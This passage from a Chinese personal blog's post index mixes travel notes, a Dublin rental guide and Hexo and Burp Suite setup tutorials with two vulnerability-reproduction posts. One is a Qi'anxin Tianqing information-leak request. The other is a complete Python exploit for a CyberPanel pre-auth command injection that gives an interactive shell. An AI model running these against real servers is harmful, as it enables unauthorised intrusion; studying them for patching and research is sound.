漏洞利用: 只需向目标服务器发送一个简单的 GET 请求： 12GET /runtime/admin_log_conf.cache HTTP/1.1Host: [目标服务器IP]:8080 泄露的信息: 泄露了奇安信天擎终端安全管理系统的内部路由配置信息 漏洞复现 http://ip/runtime/admin_log_conf.cache","tags":["漏洞"],"categories":["网络安全"]},{"title":"Java多版本环境，以应对不同安全工具","path":"/2024/11/13/Java多版本环境，以应对不同安全工具/","content":"前言 许多安全工具都是基于 Java 开发的。但这些工具对 Java 版本的要求各不相同，迫使不得不在电脑上同时维护多个 Java 环境。 就我个人经历而言，尽管已经安装了所需的各种 Java 版本，但大量工具都无法正常启动，也是由于初期环境变量配置混乱进而导致的。 配置多版本 Java 环境 首先，确保已安装所需的 Java 版本，例如 Java 8、Java 11 和 Java 20。安装完成后，Java 可执行文件的路径可能如下（Windows系统安装在C盘的情况下，默认路径不做更改）： 12345678# Java 8C:\\Program Files\\Java\\jdk1.8.0_xxx\\bin\\java.exe# Java 11C:\\Program Files\\Java\\jdk-11\\bin\\java.exe# Java 20C:\\Program Files\\Java\\jdk-20\\bin\\java.exe 切换 Java 环境的方法 方法一（推荐）：手动指定 Java 路径 直接在命令行中手动指定 Java 可执行文件的路径。例如，一些漏洞利用工具只能在 Java 8 环境下运行： 12# 运行需要 Java 8 的工具&amp; &quot;C:\\Program Files\\Java\\jdk1.8.0_xxx\\bin\\java.exe&quot; -jar yourTool.jar 之所以推荐这个方式，是因为能够精确控制 Java 版本，直接绕过系统默认 Java 环境，当然，更关键是，环境变量混乱导致第二种方式行不通…… 方法二：设置环境变量 JAVA_HOME 通过设置 JAVA_HOME 环境变量，可以指定全局使用的 Java 版本。 确保各 Java 版本环境变量已配置 确保已经为不同 Java 版本单独设置了环境变量 配置 Path 环境变量 找到系统变量中的 Path。 点击“编辑”，确保添加以下条目： %JAVA_HOME%\\bin 这样，Path 中的 Java 可执行文件路径会根据 JAVA_HOME 的值自动变化。 切换 Java 版本 当需要切换 Java 版本时，只需修改 JAVA_HOME 的引用变量，例如： 切换到 Java 8： 修改 JAVA_HOME 的变量值为 %JAVA8_HOME%。 切换到 Java 11： 修改 JAVA_HOME 的变量值为 %JAVA11_HOME%。 切换到 Java 20： 修改 JAVA_HOME 的变量值为 %JAVA20_HOME%。 修改后，无需手动调整 Path，系统会自动根据新的 JAVA_HOME 值加载对应版本的 Java。","categories":["网络安全"]},{"title":"burpsuit 小程序抓包配置记录","path":"/2024/11/06/burpsuit 小程序抓包配置记录/","content":"关键在于 代理证书的安装与信任：微信小程序需要通过HTTPS进行通信，抓取HTTPS流量时，Burp Suite的自签名证书必须被小程序信任。 代理环境设置：Burp Suite需要配置正确的代理，且确保手机/小程序运行环境能成功访问Burp代理地址。 出现的问题： 证书和代理配置均已完成，但仍受到限制，不可用== 关闭代理软件（如 Clash）。 禁用本机自定义代理设置。 而我遇到的情况，则是因为以下原因。 打开控制面板 → 网络和 Internet → Internet 选项，到高级选项卡中，找到“检查发行商的证书是否已吊销”，取消勾选。 启用“检查发行商的证书是否已吊销”选项后，系统会通过 CRL（证书吊销列表） 或 OCSP（在线证书状态协议） 查询证书是否被吊销。 Burp Suite使用自签名证书作为中间人证书拦截 HTTPS 流量，但该证书并不由信任的权威 CA 签发，且无法在真实的 CRL 或 OCSP 查询中通过验证。 吊销检查失败后，客户端会认为证书不可信，拒绝连接。","tags":["工具"],"categories":["网络安全"]},{"title":"【漏洞复现 - 241029】CyberPanel 存在远程代码执行（RCE）漏洞","path":"/2024/10/29/CyberPanel has a remote code execution (RCE) vulnerability/","content":"过程 偶然发现What Are My OPTIONS? CyberPanel v2.3.6 pre-auth RCE 于是乎抱着学习的心态，进行测试，根据cyberpanel文档说明，搭建本地环境进行漏洞复现 CyberPanel 是一个使用 Django 框架的 Web 应用程序，主要用于管理 VPS 上的各种服务。 首先进入主页时，只有登录功能，通过查阅文档，发现以下信息 Django 中处理 HTTP 请求 body 的方式 在 Django 中，每个请求对象（request）都有一个 body 属性，存储了请求的原始内容。根据 Django 的文档说明，body 属性会捕获传入的原始请求数据，而这个数据并不区分请求方法。无论是 POST 还是 PUT 请求，只要发送了 body，Django 都能处理。 通过测试，发现中间件仅对 POST 请求进行字符过滤和安全检查 → 其他 HTTP 方法（PUT、PATCH、OPTIONS）没有被过滤 → 利用这一逻辑缺陷，绕过中间件安全检查。 EXP 1234567891011121314151617181920212223242526272829303132import httpx import sys def get_CSRF_token(client): resp = client.get(&quot;/&quot;) return resp.cookies[&#x27;csrftoken&#x27;] def pwn(client, CSRF_token, cmd): headers = &#123; &quot;X-CSRFToken&quot;: CSRF_token, &quot;Content-Type&quot;:&quot;application/json&quot;, &quot;Referer&quot;: str(client.base_url) &#125; payload = &#x27;&#123;&quot;statusfile&quot;:&quot;/dev/null; %s; #&quot;,&quot;csrftoken&quot;:&quot;%s&quot;&#125;&#x27; % (cmd, CSRF_token) return client.put(&quot;/dataBases/upgrademysqlstatus&quot;, headers=headers, data=payload).json()[&quot;requestStatus&quot;] def exploit(client, cmd): CSRF_token = get_CSRF_token(client) stdout = pwn(client, CSRF_token, cmd) print(stdout) if __name__ == &quot;__main__&quot;: target = sys.argv[1] client = httpx.Client(base_url=target, verify=False) while True: cmd = input(&quot;$&gt; &quot;) exploit(client, cmd)","tags":["CVE"],"categories":["漏洞复现"]},{"title":"爱尔兰租房全攻略：旅行寻房记","path":"/2024/09/06/爱尔兰租房全攻略：旅行寻房记/","content":"计划在爱尔兰旅行，住宿是首要解决的问题。本文将结合我的个人寻房经验和一些网上搜集到的实用信息，为大家提供一份详细的爱尔兰租房攻略，希望能帮助大家少走弯路，顺利找到心仪的落脚点。 租房前的灵魂拷问 在开始找房之前，不妨先问自己几个问题： 爱尔兰什么时候好找房？ 对于旅行者来说，避开9月开学季的高峰期可能会更容易找到合适的房源。但如果你的行程包含9月，那就要做好提前准备了。 想住在哪里？ 都柏林市中心生活便利，但租金较高，且治安混乱。如果预算有限，可以考虑稍远一些但交通便利（靠近luas且周边有Aldi、Lidl）的区域。 住酒店是否可行？ 强烈不推荐！都柏林酒店费用约200-500欧，折合人民币一晚上最少也1600￥，如果是不差钱的也就不必再看本文章了，如果你旅游时间超过半个月，强烈建议找短租。 短租房源哪里找？ Line群（如台湾人/日本人群组）： 这种群组通常是内部消化房源，价格可能比市场价便宜，但需要人脉关系。 微信、小红书： 这两个平台上有不少华人发布的租房信息，但要小心甄别真假。 我的求租信息（英文版） 以下是我在各大平台发布的求租信息，供大家参考： 🌟 Searching for a Room in Dublin 🌟 Hello, I’m looking for a room in Dublin for a 3-month stay. Here are my requirements: Move-in Date: [你的入住日期] Lease Term: 3 months (flexible) Housing Requirements: I have a regular schedule, do not disturb others, do not smoke or host parties, and will treat the property with respect. Location: I’m interested in areas along the Luas Green Line, but open to other convenient locations. Important Note: I will not make any payments without viewing the property first. If you have a suitable property, please contact me! WhatsApp: +353[你的WhatsApp号码] Thank you! 邮件问询模板 Dear [房东姓名/Sir/Madam], I hope this message finds you well. I came across your rental listing and am very interested in the [房型] available in [区域]. I am planning a 3-month trip to Ireland and your property seems like a great fit. [简要自我介绍，如旅行目的、个人习惯等] I plan to move in on [入住日期] and stay for approximately 3 months. Here are a few further questions I have: Are you the landlord of the property? How is the rent paid, and through what method? [其他问题，如关于bill、室友等] I would appreciate it if you could provide more details. I look forward to your reply! Additionally, I have WhatsApp, so please feel free to add me if it’s convenient: +353[你的WhatsApp号码]. Best regards, [你的名字] 租房渠道大盘点 Facebook小组： DUBLIN- Ireland Housing, room to rent/apartment, sublets and house for sale Rent in Dublin ACCOMMODATION IRELAND …（其他相关小组） 网站： Homestay.com：适合短期住宿，房源稀少。 Rent.ie：房源较贵。 Airbnb.cn：价格高，房源质量参差不齐，但可以作为短期过渡的选择。 Daft.ie：爱尔兰最常用的租房网站，房源多但竞争激烈，需要提供一些个人资料。 Line アイルランド情報交流板 日本相关网站（已在前面列出） 日本人在爱尔兰租房的吐槽（可参考） 若者泣かせのアイルランドの家探し sekai-ju.com/life/irl/life/ire-rent/ (2019年) samurai-kokou.com/2023/07/04/post-1085/ 租房注意事项 位置： 考虑公共交通、生活便利性和个人喜好。提前熟悉地形图非常重要！ 可以利用Google Maps等工具，了解不同区域的交通情况、周边设施（超市、公园、餐厅等）以及到主要景点的距离。 交通： 查看附近的公交车、火车或轻轨（LUAS）线路。 区域： 个人推荐南边（如果预算允许），如Ballsbridge, Donnybrook, Sandymount, Ranelagh, Rathmines , Rathgar, Terenure, Dundrum等，这些区域通常比较安全、安静。 房型： 根据需求选择独立公寓、合租房或单间。 房屋设施： 查看房屋是否提供家具、电器、暖气等。 租赁合同： 仔细阅读合同条款，尤其是租期、押金退还条件等。 租房平台： 通过Daft.ie和Rent.ie等可靠平台寻找房源。 房东或中介： 确保房东或中介合法可信。 安全性： 考察租房区域的安全性。 能源效率： 检查房屋的能源评级（BER）。 看房时要问的问题 房租如何支付，支付方式，合同期限？ 押金是多少，退还条件？ 房租是否包含bill？ 检查淋浴的水压和热水。 可以自由使用淋浴间和厨房吗？ 公共区域清洁和垃圾倒运是否有责任制？ 有冰箱如何分区、宵禁等规定吗？ 市中心半小时步行圈 都柏林区域图","tags":["Dublin"],"categories":["在路上"]},{"title":"一些文化碎片与都柏林夏日（番外篇）","path":"/2024/08/06/印度走马观花：一些文化碎片与都柏林夏日（番外篇）/","content":"我对印度的初印象，主要来自几部令人印象深刻的电影。《三傻大闹宝莱坞》、《摔跤吧！爸爸》、《调音师》，每部都让我看到了不一样的印度。特别是片中的人物，热情似火，仿佛拥有无尽的活力，一派欣欣向荣之景。这不由得让我想起，日本作家芥川龙之介，小说罗生门的开篇：”你还有旺盛的生活欲望吧？“。是的，我的欲望已然散去，徒剩下骷髅。 除了电影，印度咖喱也享誉盛名，风味独特。另外，印度食物的烹饪技法，和美国那些工业化的快餐相比（炸鸡、炸薯条），印度菜更注重还原食材的本真，这让我觉得更健康，也更认同这种饮食理念。 当然，印度现存的种姓制度我了解不多，所以不敢妄加评论。 另外，印度各个地区都有自己的方言，很多人之间都听不懂对方在说什么，但用英语交流却完全没问题。这可能也是为什么那么多印度人在IT行业发展得不错吧。印度还有条著名的恒河，被称为&quot;母亲河&quot;，听说是印度文明的发源地。 最后，我想谈谈关于歧视的问题。我曾一度认为中国没有基于肤色的歧视，因为中国是一个以单一民族（少数民族极少）为主的国家。但实际上，无论是对少数族裔还是外国人，偏见都是存在的，尤其是互联网放大了人性的恶。所以，平等相处需要我们每个人的努力。 把一个人看作一个国家，无异于灭杀其人性。这种做法是对个体独立性的否定，也是对人性的践踏。 上次在都柏林与印度朋友 Pradyumna 见面，他展现出对科技的兴趣，让我印象深刻。不仅熟练使用 GPT，还告诉我 VIVO 在印度非常受欢迎。最让我忍不住拍腹大笑的是，他说，他们用 Edge 浏览器下载 Chrome！在他看来，Edge 浏览器唯一的用途似乎就是下载 Chrome。那天，我们从市中心新开的迪卡侬一路逛到圣斯蒂芬绿地，又去了商场和艺术展，整个旅程都非常愉快。最让我难忘的是，对方那种自然而然的相互尊重，这真是一段美好的回忆。 对了，还有 Bray 航空展，让我第一次感受到都柏林如此缤纷多彩的生活。可能也和夏季有关吧，到了冬天大家可能就不怎么出门了。 轮船在缓缓驶来 航空表演之爱心","tags":["Dublin"],"categories":["在路上"]},{"title":"Dublin Tour","path":"/2024/06/20/Dublin Tour - 序言/","content":"4726bbc9ea369f744cf597d75ccaf73bb293b26770222225929a6a2c76bb044f6cd7e4138d9b09088a5ef5d501e56e461cf00656e90d8cf35e590b5f50ed2ceffe573b18dfdd91ded1ec5c2b77379ec8368522a6eaa56543b1eac0c179d4cea98b905aa0e723a8db0756f75733403f6195506d3cdc00fcede1e3ca93785a227e083bd67a9875a632260b2c8774ce2fd1cdfab533056aa24ab097092827c9853d56171738cca107e43cb490f748ef36db539f75c710deaf6f8bee511c122667286d0d4567ee0d30c152e98877e76cfd5438a98b8c64cc03be8f4cc3d0d727fa1d5ed486ca15a6b533c094237f84979fec2801079dfa09a4a001a17046fd25d5298c02de316f354dbb651460283dfda04dd48812a1f79698f67afab04e6d6547b97199dcc0c3bb76286b82430367397c31c4a8b7bb47d449c2a5df77b3a9e3fc7e0de361249fcd866170ec9a31b62c620164a0c509355dc9e238729b9897f8bd431aec7b0bfb4ea48b9b3e11f4effcabafc9732895c666c514352ad805e9e9182369c9c30353c1469fdaa1cb5251f2cd952837f11c3ea0a173a85714ca4296a10197366e95bcc468ce931fd86a46e9f677359c8e741f2089598fb29ac9acf164c6f75b1a4657a003560b20b64bb31df1ec3f55dad42f95cd51a4d33262ffe481a8a18e732f485e82b6a6d3a09727da28fa3ff134d90d2578590c2720fffd6be524b707d8bd8b0f3f511280d041d3f6e76330daded10bcd5a88e000a98d886faf9fe3e0a7622d5e59e4c0756ba62dfb26365b23a3619f3a06a2a183b62be6160238eb1975cc9e98048269ca6ae6d0c130b9436dee10c647e6380639800f4d1de17f6fea9e9c0f304e469f159363bf33c7b7e06933b5043cd29c7550e0301aa5f633a698a459d3f44624ca578edc61067f5e39ddcb85b406f3580406b85f3daee5196017df0023e2ea866fbda4123990a549dada9a9ade6e0a4c17d96a13a6c2824ebe9e1f2528149eeda6634998682410585cf8882eb11949087403254e74f6ad4736d6393ffcfcd451b072deca6ad9a084766545ee4b038bc94a4381808b5cd62ae78cb5f549c395ae092fbafec01fe2b567e30dbb209c7214338321c0fa279da6029f52cbc136bbb4ca729f987289a0b334b5bcc881019e370ef12600f35811c1c82dfc5c7ade568f7fbdaa570d1b56556e25ca08726f6baf4a8161103a756337aa52c7b0b15db9170509c544e905f5b6d4c1ac4e5606ed4abde7732021fdb5dabf0e449ee2e6d50674b1495d01115e16a84c6f848dc33931b62758e0ea8fc4b64d8fbc5905ef6c21ddc0b1f2ed65238f187e43bf142418090e547c17d57c4f01d5789cb1705041b4954c65ffb10b233aed6e58a352048044d2249bdc641405ce99d452745c74eebe0a7b4de6b3418423ce3ba25c745ba88e42b0ff933594c81e224515624d1b0cf0975dc7ac9ce00e66e8459b7926cae1c8393010220671b5a3a63397c78d553a4f548bae0923f8784a42a76c8afc11642167503768ff7e99d474d229a07a29e609f122ddfbc7ea4a82e34596e8fa8867d6d34e108be7b0dcee189ca6205a57bdd790df717b0db0363bfb1ca93dd4c0908f93d0ad5436570bff685be8621676ba48405d5d448aede009339c49ebd3fa8c55d5fc4fc976ca70208bc76bf6ad2421bc516a434fe5aa37d89715d8314af3d6f50823f9353a4276a4401fa1e137fd49132d8a13e796e0423275911b967ef9391ed283f97b6eb9c1156f24fe2affdad69e515daade75a44f43512c21a42025e80bf5c4a971e6068cd462cbfcbb8d266aa4613a64e1928b1a142f5e477350b51b9d6e9e3b1469eba15e4f9cd9a4e33cd608f17b5e3ca513ca95bbb9d6657e56c76a7df17bd59b54f7ab7c8456182424c42208f030f38c226fc33fcb59b6472016c57dd0545359fc9a0ed5bc6b421ebbe45cf5036f4086b458919585030c512bf4b4426213042c36c3923d9c2f97e09792aaeb4cd084ff1219848977a75fb8fb5eff286cbcd3f0b169b78d88cdc9a88eb0f6c39c47399ac2a0066444ff05a8d370016da7bf9a2b787da86b7c78cb2f98db993535f68e551f10db826ef238efc5805cbea9fef5bf4fab64992781b65e25f8e1992e0e0997f880ad15eb92444de235f2a8f0e4ee3c0b231f5e8196a6f577d4ba36d9d001356ad94f4b180ddb7fe99693198d894908ecc782815941d353bbf9e6644bbfac2cc7b42500b1484d1cbe20b775ec40ecbc97c7839e4a07e859c4ceae9586ca68fb6d429e9e579d0285777ebdd5a2c757874d17e71d4496755cb46e281a5d496aa8c6a276476a2e4c4f24b40b8180b2a96b70c1f2b00db233c447abb4a083d7ff5a0a9735cdad69d8c1b9affa840ba75085d8b7cec9a3f2f5d3679c7c81ab6c81a4c841c3574472c70a492f26df89269eb2bb7cc401a49868de20b7bc172848b56736e8d3b44d3e8f32062a6a928e8bd4c8b49be485526e4305bbddc664d0e21b4786dcb98f2273eb678aeb55b96db658fa75f7200d723501fe14ef222f6198f6914e520bc5713b7df2948b97cad79a150fc8477d1443d7e81878fa86d37d8d677b13f1ec9ac387eb6bf8aea51ddf1213231fedef6b42456c6edae834b9941f4a066356e7901b73e4e3cbb1a7e3f8fba4ca47abae90aa1f7c4439372ac29427c03597ef87b5953e8831f2c0ee117123eeca9e581b075486364db5f913879ac996f00998a6cb1c5eb004f19376929f4fabab27aa4454f02b0c7cd325a76de9b4537e6d0479091327b45bceb0b943e8d27817a3efda3ac66c9a7cfcb237d4b142f2d13e322434cd8cb35a008e4d7e28fa30e653a5d77678882c5853770aaf2174fa7a8254411b363bb41102b740a3e1c1169acaec2aba0848d3cd78e39bde024880cc48ccfabeec3530850f1535fb487ff24c752b305bca3a0dcb6bd7fe7617af029c18e639ed8d5a2a3b1761bca478d99bd483fb97e8614755786d542fbc66a29e4cb9e134f5eefb484ec0ad89e88db902161e28c6cd03e8a11740249eece0095a54f6ede56464c1387066f9907e4900a57b496bc934df4ece6d3ada8df669f588cbff1e13677db9255932f7e4119212519e42879e11399dcb3b85fd1d61ae65441243a599ba1bfda2373c3d253256023c2cb963cc2694c6d0496c13329331e530bf6eb4de05514ddb52b3b5ddee7dff70fcbe972002603c2beb3fcda47da92ee968ec79723a7a06c667f06b44b3a1ab38b359a44cdad7715ca2204704f3427bbbbf4959b6ce2e7845ab35e941dc43c8fbe56944a1b02060ade042e32b58df5ca3ab407a676104fefdcaab97c925c92379ace26510d26f86128d4db78fd77d99aa567d089f1021dc9ded1fb64c2025dfc2c6cd1d0bc20797f87eac88713fe8299785340b583830e8d41b8e44e79557deab7b4e2f9a2688a84c3a68c37720f5ea201749c97bd3448ae1cf5a41fd7ecdadc4e424f636257de3a6a63ed0c052ed66cd60ed4e14d3d531a4aacf48aea2adf6afde98786ddef76c920e318ed37b1412c9cb7306ea3f9558bf0c2828e09e702415c13513a85b0e7c1fde9468a1dcba8a9b6d3934b2eb0cb057a002e913d1e38318421a282ae60e8531bb48a25d7dc961cf862737a38d2669b78e63e11911ffdfd0c5e554d0cc9bad993a01d19297d360f714c2fc5d372d6494502d32850c8a52797980ce3e4ffa0ff537bedbaa2ff82757460152d60da50b2574aa60812173ac353379d58244f31a41dd24038eea3b527327e5454f6e2d68ac70a6ecc81eaf684958e5b115568ac0faf0be7682a99b10a211aad2854eb415b70f1daed03da977c0dfe0e94fb69db99e71c9d0f79c613e04c86257ccdba898a14d52359dec6129d211a3225fafcf5841d7c7504270f8fcbb7bdef6bfde2f59813d4cc987be82db41c1e02f15fefcc16d52a29aa508ba8e83b41f9d458311ae715b7bfb054e2dcce4b285217f538ccaf6f1200f9aa4f890ba743933d550dbed0f420a2a2c31e344eb6c243334368d9d38c392c04006957a9fbffb13ab0f0f5369333d133fd3d222e0094d52e7b8cdb72a6eb4cf6bfd6577e4f2bd244c26e802f65f7790319e3c143a3daaf8916c0d330c198ca5e0e422ad9a19dfed6dbff55c52cf9291dff7a094edd2fe29efba77682f12ab9e167d7be9d28e45b9c2afae8c3481724ddb2c09891b84bb4987a36fa86f5f97e0d6863e4664ff2f155fc7f502025aca756f5c384a8a7de87575ca9d53d09ca69f8cdf88d85cabebb1f209f8989526c2c4d5213b1d75f4f23948f2653d6b8949b1a0cdcce93cbc0db3298f7cade28c9be16828dffbc99c3c2f0ae808742efa0802810ea2b5bf5ae77c0e744e485e5477e353a91bc9a50edaebe1b0eaa3c1574a037d1a3826f73c9911e42a6ba7e9e53e26e6692243d86d236439a31a8de42e6417cc0eeeae7bfe65cc360e26055c06f8c1c30056f7d21185dba6fe6de03c4e47adccc8572b725bfdb61ff27b7bc433e9efbb6066cb68c862e3a16524d20dd2b98616f95ada5654bb271821d8b7933a4f3054dbcc6ffdfa784cf72f6a2d0f6917bcb5b94d8f2ea48dbc754c672d799379a38eca00e0b7d0abfd6185e7352e4456584566c1c06b1cf3ef9e8f1b3282a7b4dd2330ff687b68ab1f66300c928b478c6a363001d4100d530402aabcee1379a4a0ac8cbcbb09a56d2f4fa95d3ab5e5b43299c75d531a0e4aae700415eebc3b083d034ad11cc91683248a275ce41c10ad85e8d89b1aea145b3623 欲救生快活，须下死功夫","tags":["Dublin"],"categories":["在路上"]},{"title":"Test Stellar","path":"/2024/01/28/Test/","content":"测试文件 mermaid graph LR A(Section A) -->|option 1| B(Section A) B -->|option 2| C(Section C) graph TD; A-->B; A-->C; B-->D; C-->D; 实现博客专栏/专题 ……","tags":["Test"]},{"title":"Hexo 和 Stellar 搭建个人网站","path":"/2024/01/28/Hexo 和 Stellar 搭建个人网站/","content":"一、说明 本文将涉及以下工具/服务，用于搭建和运行个人网站，之前网站代码一直没有维护，索性文章还有备份。 名称 说明 作用 Node.js 一个基于 Chrome V8 引擎的 JavaScript 运行环境，可以让 JavaScript 代码在服务器端执行 用于开发服务器端应用程序，运行 JavaScript 代码 Git 分布式版本控制系统 用于追踪文件的变化，协作开发和管理项目的版本 Hexo 静态博客框架，可以将 Markdown 文档解析渲染成静态的 HTML 网页 用于快速搭建和管理个人博客网站 Stellar Hexo 主题商务风主题 为 Hexo 博客提供商务风格的主题模板 github.pages 免费的静态站点托管服务，可以在 GitHub 仓库里托管和发布自己的静态网站页面 用于托管和发布静态网站，方便快捷 typora Markdown 编辑器，目前费用89.00 CNY 用于编辑和预览 Markdown 格式的文档，方便写作和编辑 npm Node.js 的包管理工具，用于安装和管理 JavaScript 包和依赖项 用于管理 JavaScript 包和模块的安装、卸载和更新 SSH 安全外壳协议（Secure Shell），用于在网络中安全地传输数据和命令 用于在网络中进行安全的远程登录和数据传输 YAML 一种人类可读性高的数据序列化格式，常用于配置文件和数据交换 用于编写易读易写的配置文件和数据交换格式 阿里云OSS 阿里云对象存储服务（Object Storage Service），用于存储和管理海量数据 用于存储和管理大量的文件和数据，提供高可靠性的存储服务 oss-browser 阿里云 OSS 的桌面客户端，用于便捷地管理和操作 OSS 上的文件 操作阿里云 OSS 的文件，管理你的图片 PicGo 一个开源的图片上传工具，支持多种图片上传方式和图床配置，可以方便地上传图片到指定的图床，并生成图片链接 用于快速上传图片到图床，方便在博客、论坛等地方引用图片 CDN 内容分发网络（Content Delivery Network），用于加速网站内容的传输 用于加速网站内容的传输，提高网站访问速度和用户体验 域名 网络上的地址，用于标识一个或多个 IP 地址的易记名称 用于在互联网上唯一标识一个网站或服务的地址 二、流程 1. GitHub 账户 首先，你需要拥有一个 GitHub 账户，注册流程不再赘述。注册完成后，你需要创建一个新的仓库（repository），仓库名应该是 “你的用户名.github.io”，其中的 你的用户名 部分需要使用你的 GitHub 帐号名称来代替。这是一种固定的命名规则。举例来说，如果我的 GitHub 帐号名是 “example”，那么我的仓库名就应该是：“example.github.io”。 请注意，目前 GitHub 实施了新的规定，出于安全考量，你需要启用 GitHub 的双重身份验证（2FA）。否则，渐渐地你可能会无法正常使用 GitHub。 2. 创建网站文件夹 在本地选择一个位置，创建你的博客文件夹。 3. 安装 Git、Node.js、Hexo 首先需要检查你的本机是否已经安装了这三项工具。以下是检查步骤 12345678910111213# 检查 Gitgit --version# 检查 Node.jsnode --version# 检查 Hexohexo --version# 检查版本信息如下Git 版本为：2.35.2.windows.1Node.js 版本为：v21.5.0Hexo 版本为：hexo-cli: 4.3.1 如果未显示版本信息或显示类似 “command not found”（命令未找到）的错误提示，则说明你尚未安装当前工具 咱们首先先下载 Git——https://git-scm.com/download/win 安装完成后，打开命令行并输入以下命令来测试是否成功安装了 Git，以下情况为安装成功 安装成功后，将你的 Git 与 GitHub 帐号绑定，鼠标右击打开 Git Bash。 12345678# 配置 Git 用户名和邮箱：通过 `git config` 命令设置 Git 的全局用户名称和电子邮箱地址，这样在提交代码时就能够将其与你的 GitHub 帐号关联起来，让其他人知道是谁提交了这些更改。git config --global user.name &quot;GitHub用户名&quot;git config --global user.email &quot;GitHub注册邮箱&quot;# 生成 SSH 密钥：SSH（Secure Shell）密钥对用于安全地与远程服务器进行通信，这里主要用于与 GitHub 进行安全通信。`ssh-keygen` 命令用于生成 SSH 密钥对，其中 `-t rsa` 参数指定了生成 RSA 类型的密钥，`-C` 参数用于指定注释，一般填写你的 GitHub 注册邮箱。ssh-keygen -t rsa -C &quot;GitHub注册邮箱&quot;# 将 SSH 公钥添加到 GitHub 中：生成 SSH 密钥对后，公钥会保存在一个文件中，通常是 `~/.ssh/id_rsa.pub`。将这个公钥添加到你的 GitHub 帐号的 SSH 密钥设置中，这样 GitHub 就可以验证你的身份，并允许你通过 SSH 协议进行代码的读写操作。 生成密钥后，将其添加到 GitHub 中。 在 Git Bash 中输入以下命令检查 GitHub 公钥设置是否成功: 12# 这条命令会尝试连接 GitHub，并返回一个欢迎消息，确认 SSH 设置是否成功。ssh -T git@github.com 可以看到，已经成功了 1. 提示 PS：我本人在这边踩了一个坑，可以在这边加上-v来看 debug 1234ssh -vT git@github.com# 清除 DNS 缓存ipconfig /flushdns 最后的解决方案是在本地 hosts 文件中强制 github.com 解析到 ip 140.82.113.3 hosts 文件通常位于——C:\\Windows\\System32\\drivers\\etc\\hosts 这种情况通常发生在 DNS 解析出现问题时。DNS（Domain Name System）负责将域名解析为对应的 IP 地址。当你尝试连接到 GitHub 时，你的计算机会向 DNS 服务器查询 GitHub 的 IP 地址，然后建立连接。 在你的情况下，由于某种原因，DNS 解析未能正确地将 GitHub 的域名解析为正确的 IP 地址，导致连接超时问题。通过将 GitHub 的域名手动映射到正确的 IP 地址，你绕过了 DNS 解析过程，成功建立了连接。 2. 提示 在C:\\Users\\xxx\\.ssh路径下，新建config文件 这个配置文件的作用是让 SSH 客户端在连接 GitHub 时使用指定的私钥进行身份验证，从而可以进行安全的通信，例如上传代码或者部署静态网站等操作。 12345UserHost github.com HostName github.com User git IdentityFile ~/.ssh/id_rsa 下一步，安装Node.js、Hexo Node.js——https://nodejs.org/en/download 12345# 使用 npm 命令安装 Hexonpm install -g hexo-cli# 初始化博客hexo init npm 的下载速度受到网络环境和源服务器的影响，如果存在 npm 命令执行非常慢的情况，可以使用国内的镜像源来加速下载 12# 淘宝镜像npm config set registry https://registry.npm.taobao.org/ 会初始化 30M 左右的数据，所以hexo init会相对缓慢，可慢慢等待，等初始化结束后，可看到以下文件 12# 直接在 Git Bash 中输出，本地预览hexo s 然后访问 http://localhost:4000，即可本地预览 4. 更换主题 Stellar 是一个内置文档系统的简约商务风 Hexo 主题，之所以更换为该主题，主要还是因为，Stellar 的设计理念——真正的简约远不止删繁就简，而是在纷繁中建立秩序。 文档说明——https://xaoxuu.com/wiki/stellar/#start 12345# 在终端中输入npm i hexo-theme-stellar# 在 blog/_config.yml 文件中找到并修改theme: stellar hexo s预览看一看，已经成功了！ 接下来就是修改GitHub\\MyBlog\\_config.yml和MyBlog\\themes\\stellar\\_config.yml _config.yml： 位置：GitHub\\MyBlog\\_config.yml 作用范围：全局 内容：主要包含整个Hexo博客的全局配置，例如网站标题、网站描述、网站URL、作者信息等。 用途：用于配置整个Hexo博客的基本信息和全局设置。 _config.yml： 位置：MyBlog\\themes\\stellar\\_config.yml 作用范围：主题级别 内容：主要包含与主题相关的配置，例如主题的特定功能设置、样式定制、布局等。 用途：用于配置Hexo博客所使用的特定主题的相关设置，允许用户对主题进行个性化定制和配置。 可以借助 ChatGPT 进行中英文比照，辅助修改 修改全局文件——位置：GitHub\\MyBlog\\_config.yml 1234567title: Rabbit&#x27;s Bloglanguage: - zh-CN - entheme: stellar 如果你要写文章，直接在MyBlog\\source\\_posts路径下写就可以了，格式为 .md，Typora 编写 Markdown 在文章的最上面，需要添加以下元信息： 这些元信息包括文章的标题、发布日期和封面图片链接。你可以根据需要修改这些信息。 12345---title: 你的文章标题date: 2024-01-27 17:16:59cover: 也可以直接引用图片直链，这个位置为文章的图片--- 新建关于我 about 页 12hexo new page &quot;about&quot;hexo new page &quot;friends&quot; 1hexo clean ➜ hexo g ➜ hexo d 此处略过…… 5. 推送到 Github 修改全局文件——位置：GitHub\\MyBlog\\_config.yml 1234deploy: type: git repo: GitHub仓库地址 branch: main # 仓库的分支 branch: main 是指定部署到 GitHub Pages 上的分支，可以在你的 Github 中进行查看 最后安装 Git 部署插件 1npm install hexo-deployer-git --save 12345678# 清除 Hexo 项目中生成的静态文件和缓存文件hexo clean# 生成静态文件hexo g# 因为我本地文件与远程不符，所以强制覆盖 GitHub 上的内容hexo deploy -f 最后输出这个，即为部署成功，现在xxxx.github.io就可以访问到了 可以看到hexo deploy -f后 Github 上也已经有了文件，并且标记了提交的时间 **PS：**为了避免博客数据丢失，可以在写完博客后，发布到 main 分支并备份源文件到 blog 分支。 master 分支：这个分支用于发布生成的静态博客页面。你使用 hexo clean、hexo generate 和 hexo deploy 这三步完成静态文件的生成和部署，最终会将生成的博客文件推送到 master 分支并发布上线。 blog 分支：这个分支用于保存博客的原始数据，比如 Hexo 的配置文件、原生的 Markdown 文件等。你在写完博客后，不仅需要生成静态文件发布到 master 分支，还要将这些原始文件手动提交到 blog 分支进行备份。 同步到 master 分支： 这三条命令是 Hexo 的标准部署流程： hexo clean：清理 Hexo 生成的缓存文件和静态文件，确保不会出现不必要的文件。 hexo generate：生成静态文件，即生成网站的 HTML、CSS、JS 等文件。 hexo deploy：部署网站，将生成的静态文件上传到你的博客仓库，通常是 gh-pages 或者其他远程分支上。 手动同步到 blog 分支： git add .：将所有改动（包括新增、修改、删除的文件）添加到 Git 暂存区。 git commit -m &quot;提交信息&quot;：提交改动，-m 后面的内容是提交说明。 git push origin blog：将本地的更改推送到远程的 blog 分支。 6. 阿里云OSS 阿里云 OSS 可以作为图床的存储后端，用户可以将图片上传到阿里云 OSS 中，并通过阿里云 OSS 提供的公开链接来访问这些图片，从而实现图床的功能。 